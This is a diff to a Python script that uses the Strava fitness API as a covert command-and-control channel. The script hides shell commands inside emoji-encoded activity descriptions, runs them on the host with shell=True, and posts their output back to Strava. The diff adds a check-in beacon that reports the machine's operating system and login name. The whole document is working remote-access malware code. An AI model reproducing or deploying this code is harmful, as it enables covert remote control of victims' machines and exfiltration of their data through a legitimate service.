@@ -1,6 +1,8 @@
 import subprocess
+import platform
 import os
 import time
+import json
 import re
 from datetime import datetime, timedelta
 from contextlib import suppress
@@ -39,6 +41,22 @@ def get_activities()-> requests.Response:
     response = requests.get(f"https://www.strava.com/api/v3/activities", headers=HEADERS)
     return response
 
+def post_initial_activity():
+    description = json.dumps({"os":platform.system()})
+    json_data = {
+        'commute': 0,
+        'description': emoji_encode("🏊", description),
+        'distance': '600',
+        'elapsed_time': '1200',
+        'name': f"{os.getlogin()}",
+        'sport_type': 'Swim',
+        'start_date_local': (datetime.now() - timedelta(minutes=20)).isoformat(),
+        'trainer': 0,
+        'type': 'Swim',
+    }
+    response = requests.post('https://www.strava.com/api/v3/activities', headers=HEADERS, json=json_data)
+    return response
+
 def post_activity(description: str, parent_act_id: int):
     json_data = {
         'commute': 0,
@@ -67,19 +85,25 @@ if __name__ == "__main__":
             }
             activities = get_activities().json()
             responded_activities = []
-            for _activity in activities:
-                if (act_title := _activity.get("name","")):
-                    if act_id := re.search(r"-(?P<act_id>\d+)",act_title):
-                        responded_activities.append(act_id.group('act_id'))
-            print(responded_activities)
-            for _activity in activities:
-                if (act_id := _activity.get("id",0)) and str(act_id) not in responded_activities and act_id != MAIN_ACTIVITY:
-                    activity = get_activity(act_id).json()
-                    if activity.get("type") == "Run" and activity.get("name","").startswith(os.getlogin()):
-                        with suppress(subprocess.CalledProcessError):
-                            command = emoji_decode(activity.get("description",""))[1:]
-                            a = subprocess.run(command, shell=True, check=True, capture_output=True, encoding='utf-8')
-                            b = post_activity(a.stdout, act_id)
-        except:
-            pass
+            already_notified = False
+            if isinstance(activities, list):
+                for _activity in activities:
+                    if (act_title := _activity.get("name","")):
+                        if act_id := re.search(r"-(?P<act_id>\d+)",act_title):
+                            responded_activities.append(act_id.group('act_id'))
+                        if act_title == os.getlogin():
+                            already_notified = True
+                if not already_notified:
+                    post_initial_activity()
+                for _activity in activities:
+
+                    if (act_id := _activity.get("id",0)) and str(act_id) not in responded_activities and act_id != MAIN_ACTIVITY:
+                        activity = get_activity(act_id).json()
+                        if activity.get("type") == "Run" and activity.get("name","").startswith(os.getlogin()):
+                            with suppress(subprocess.CalledProcessError):
+                                command = emoji_decode(activity.get("description",""))[1:]
+                                a = subprocess.run(command, shell=True, check=True, capture_output=True, encoding='utf-8')
+                                b = post_activity(a.stdout, act_id)
+        except Exception as e:
+            print(e)
         time.sleep(60)
